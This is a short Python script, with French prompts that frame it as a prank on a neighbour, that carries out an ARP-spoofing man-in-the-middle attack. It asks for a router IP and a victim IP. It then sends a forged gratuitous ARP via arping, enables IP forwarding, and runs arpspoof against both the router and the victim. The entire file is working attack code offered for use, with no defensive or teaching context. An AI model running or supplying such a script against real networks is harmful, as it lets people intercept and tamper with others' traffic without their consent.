import os

def ip_forward():
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	
print("Prêt à pranker ton voisin ?")

ip_routeur = input("Entrez l'IP du routeur : ")
ip_victime = input("Entrez l'IP de la victime : ")
carte_reseau = input("Entrez le nom de votre carte réseau : ")
fake_mac = input("Entrez l'adresse MAC que vous souhaitez : ")
fake_ip = input("Entrez l'adresse IP que vous souhaitez : ")
print("Envoi du prank a la victime")
os.system(f'sudo arping -c 1 -U -s {fake_mac} -S {fake_ip} {ip_victime}')
print("Activation ip forwarding")
ip_forward()
print("Lancement arp spoof")
os.system(f'sudo arpspoof -i {carte_reseau} -t {ip_routeur} {ip_victime}')
os.system(f'sudo arpspoof -i {carte_reseau} -t {ip_victime} {ip_routeur}')
